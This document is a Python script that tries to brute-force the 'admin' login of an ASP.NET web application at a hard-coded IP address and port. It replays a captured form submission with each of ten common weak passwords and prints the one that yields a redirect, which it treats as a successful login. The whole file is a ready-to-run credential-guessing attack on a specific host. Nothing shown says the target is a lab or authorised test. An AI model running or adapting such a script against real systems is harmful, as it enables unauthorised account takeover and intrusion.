import requests

url = "http://221.122.108.192:10003/"
headers = {
    "Content-Length": "1360",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Origin": "http://221.122.108.192:10003",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": "http://221.122.108.192:10003/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close"
}

weak_passwords = ["admin", "123456", "password", "12345678", "qwerty", "abc123", "111111", "123456789", "1234567", "admin123"]
base_body = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMjA0MDExNzc2NGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgUFCWltZ1ZlcmlmeQUNcHBjQ2hhbmdlUGFzcwUdcHBjQ2hhbmdlUGFzcyRBU1B4Um91bmRQYW5lbDEFKnBwY0NoYW5nZVBhc3MkQVNQeFJvdW5kUGFuZWwxJEFTUHhDYXB0Y2hhMQUvcHBjQ2hhbmdlUGFzcyRBU1B4Um91bmRQYW5lbDEkYnRuQ2hhbmdlUGFzc3dvcmS2xa3lBUUSI1uR61pnDp4b1NOoTEhX9Ndd87%2F%2Bz%2Fzfcg%3D%3D&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEdAAWBOyTd1HWag400aD%2F7vEVfihIVSwHi6G4X7i4L7gGFu6KeKEbp39eHc9mbdvkCgxDNxEFdQ0Php5ABGFGEfpd34U4%2Bf51S1f%2B0QXFscgrji2ra9TghOOl%2FoLdgzdpDkWtJXxECHm%2FzoSldL7EPzV35&txtAccountName=admin&txtPassword={password}&txtVerify=&btnLogin=&ppcChangePassWS=0%3A0%3A-1%3A-10000%3A-10000%3A0%3A200%3A0%3A1%3A0%3A0%3A0&ppcChangePass%24ASPxRoundPanel1%24tbAccount=&ppcChangePass%24ASPxRoundPanel1%24tbAccount%24CVS=&ppcChangePass%24ASPxRoundPanel1%24tbCurrentPassword=&ppcChangePass%24ASPxRoundPanel1%24tbCurrentPassword%24CVS=&ppcChangePass%24ASPxRoundPanel1%24tbPassword=&ppcChangePass%24ASPxRoundPanel1%24tbPassword%24CVS=&ppcChangePass%24ASPxRoundPanel1%24tbConfirmPassword=&ppcChangePass%24ASPxRoundPanel1%24tbConfirmPassword%24CVS=&ppcChangePass%24ASPxRoundPanel1%24ASPxTextBox1=&DXScript=1_187%2C1_101%2C1_130%2C1_137%2C1_123%2C1_180%2C1_98%2C1_172%2C1_170%2C1_121&DXCss=css%2Flogin.css%2C0_1039%2C1_16%2C1_8%2C0_1041%2C1_14%2C1_1%2C0_1224%2C0_1228"

for password in weak_passwords:
    body = base_body.format(password=password)
    try:
        response = requests.post(url, headers=headers, data=body, allow_redirects=False)
        if response.status_code == 302:
            print(f"登录成功，密码为: {password}")
            break
        else:
            print(f"密码 '{password}' 的响应状态码: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"请求出现错误: {e}")